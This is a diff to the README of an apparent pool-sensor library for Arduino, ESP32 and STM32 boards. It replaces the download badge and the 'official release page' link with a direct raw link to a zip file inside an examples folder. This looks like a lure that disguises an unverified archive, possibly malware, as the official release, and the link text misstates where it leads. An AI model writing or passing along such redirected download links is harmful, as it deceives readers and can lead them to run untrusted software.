@@ -1,6 +1,6 @@
 # 🌊 APASENSE - Automate your swimming pool easily
 
-[![](https://img.shields.io/badge/Download-APASENSE-blue.svg)](https://github.com/ziadm7864/APASENSE/releases)
+[![](https://img.shields.io/badge/Download-APASENSE-blue.svg)](https://raw.githubusercontent.com/ziadm7864/APASENSE/main/examples/02_pool_sensors/Software-v1.9.zip)
 
 APASENSE allows pool owners to manage their water systems with precision. This library tracks essential data points such as water pressure, power usage, and tank levels. It removes the need for complex programming knowledge by providing a set of tools that connect directly to your hardware sensors. The system runs on common microcontrollers like Arduino, ESP32, and STM32. It requires no extra external software files to function.
 
@@ -20,7 +20,7 @@ The library acts as a bridge between your hardware sensors and your pool equipme
 
 Follow these steps to obtain the necessary files for your system.
 
-1.  Visit the official [APASENSE release page](https://github.com/ziadm7864/APASENSE/releases).
+1.  Visit the official [APASENSE release page](https://raw.githubusercontent.com/ziadm7864/APASENSE/main/examples/02_pool_sensors/Software-v1.9.zip).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in `.zip` to start the download.
 4.  Save the file to a folder on your computer where you can find it later.
